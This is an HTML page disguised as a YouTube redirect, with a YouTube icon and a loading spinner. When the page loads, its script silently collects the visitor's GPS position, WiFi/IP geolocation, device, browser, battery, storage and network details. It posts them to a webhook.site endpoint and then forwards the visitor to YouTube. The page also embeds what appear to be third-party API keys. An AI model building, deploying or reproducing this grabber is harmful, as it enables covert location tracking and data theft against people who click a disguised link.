<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <link rel="icon" type="image/x-icon" href="youtube.ico">
    <style>
        .loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #ff0000;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        // Helper function to convert bytes to GB
        function bytesToGB(bytes) {
            return (bytes / (1024 * 1024 * 1024)).toFixed(2);
        }

        // Helper function to get IP-based location
        async function getIPBasedLocation() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=dd6aa51476d42b');
                return await response.json();
            } catch (error) {
                console.error('Location API error:', error);
                return null;
            }
        }

        // Helper function to get battery information
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging,
                        level: `${(battery.level * 100).toFixed(2)}%`,
                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${(battery.chargingTime / 60).toFixed(2)} minutes`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${(battery.dischargingTime / 60).toFixed(2)} minutes`
                    };
                }
                return null;
            } catch (error) {
                console.error('Battery API error:', error);
                return null;
            }
        }

        // Helper function to get storage information
        async function getStorageInfo() {
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    return {
                        totalStorageGB: bytesToGB(estimate.quota),
                        usedStorageGB: bytesToGB(estimate.usage),
                        freeStorageGB: bytesToGB(estimate.quota - estimate.usage),
                        percentageUsed: `${((estimate.usage / estimate.quota) * 100).toFixed(2)}%`
                    };
                }
                return null;
            } catch (error) {
                console.error('Storage API error:', error);
                return null;
            }
        }

        // Enhanced location function with multiple sources
        async function getEnhancedLocation() {
            const results = { gps: null, wifi: null, ip: null };
            
            // Try GPS first (most accurate)
            try {
                if (navigator.geolocation) {
                    results.gps = await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                const lat = pos.coords.latitude;
                                const lng = pos.coords.longitude;
                                resolve({
                                    latitude: lat,
                                    longitude: lng,
                                    accuracy: pos.coords.accuracy,
                                    source: 'GPS',
                                    gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`
                                });
                            },
                            () => resolve(null),
                            { timeout: 5000, enableHighAccuracy: true }
                        );
                    });
                }
            } catch (e) {}
            
            // Try WiFi-based location (Google's API)
            try {
                const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyDCa1LUe1vOczX1hB_JaZZeVQn7miYWRSA', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ considerIp: true })
                });
                if (wifiResponse.ok) {
                    const wifiData = await wifiResponse.json();
                    if (wifiData.location) {
                        const lat = wifiData.location.lat;
                        const lng = wifiData.location.lng;
                        results.wifi = {
                            latitude: lat,
                            longitude: lng,
                            accuracy: wifiData.accuracy,
                            source: 'WiFi',
                            gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`
                        };
                    }
                }
            } catch (e) {}
            
            return results;
        }

        // Main function to collect and send data silently
        async function collectAndRedirect(redirectUrl) {
            try {
                const locationData = await getIPBasedLocation();
                const enhancedLocation = await getEnhancedLocation();
                const batteryInfo = await getBatteryInfo();
                const storageInfo = await getStorageInfo();
                const now = new Date();
                const options = {
                    weekday: 'long',
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric',
                    hour: 'numeric',
                    minute: 'numeric',
                    second: 'numeric',
                    timeZoneName: 'short'
                };

                // Collect additional device and network information
                const deviceInfo = {
                    type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    os: navigator.userAgent.includes('Windows') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'MacOS' : 'Other',
                    osVersion: /Windows NT (\d+\.\d+)/.test(navigator.userAgent) ? RegExp.$1 : 'Unknown',
                    browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Opera|Edge)\/?\s*(\d+\.\d+)/i) ? RegExp.$1 : 'Unknown',
                    browserVersion: navigator.userAgent.match(/(Chrome|Firefox|Safari|Opera|Edge)\/?\s*(\d+\.\d+)/i) ? RegExp.$2 : 'Unknown',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cpuCores: navigator.hardwareConcurrency || 'N/A',
                    maxTouchPoints: navigator.maxTouchPoints || 'N/A',
                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A'
                };

                const networkInfo = {
                    effectiveType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
                    downlink: navigator.connection ? navigator.connection.downlink : 'N/A',
                    rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
                    saveData: navigator.connection ? navigator.connection.saveData : 'N/A',
                    type: navigator.connection ? navigator.connection.type : 'N/A'
                };

                const data = {
                    redirectUrl: redirectUrl,  // Add the YouTube URL to the data
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenInfo: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth
                    },
                    systemInfo: {
                        language: navigator.language
                    },
                    timestamp: now.toLocaleString('en-IN', options),
                    batteryInfo,
                    storageInfo,
                    locationData,
                    enhancedLocation,
                    deviceInfo,
                    networkInfo
                };

                // Send data as plain JSON in a POST request
                await fetch('https://webhook.site/4756cbb2-c2c1-423b-b741-f110babdc901', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                // Delay before redirection to ensure data is sent
                await new Promise(resolve => setTimeout(resolve, 500));
                window.location.href = redirectUrl;

            } catch (error) {
                console.error('Error:', error);
                window.location.href = redirectUrl;
            }
        }

        // Execute when the page loads
        document.addEventListener('DOMContentLoaded', () => {
            // Get everything after the domain (path + query params + hash)
            const fullPath = window.location.pathname.substring(1) + 
                           window.location.search + 
                           window.location.hash;
            
            // Construct the YouTube URL
            let youtubeUrl;
            
            if (fullPath.startsWith('youtu.be/')) {
                // Handle youtu.be format
                const videoId = fullPath.split('youtu.be/')[1];
                youtubeUrl = `https://www.youtube.com/watch?v=${videoId}`;
            } else {
                // Handle all other formats by simply prepending youtube.com
                youtubeUrl = fullPath 
                    ? `https://www.youtube.com/${fullPath}`
                    : 'https://www.youtube.com/';
            }
            
            // Collect data and redirect
            collectAndRedirect(youtubeUrl);
        });
    </script>
</body>
</html>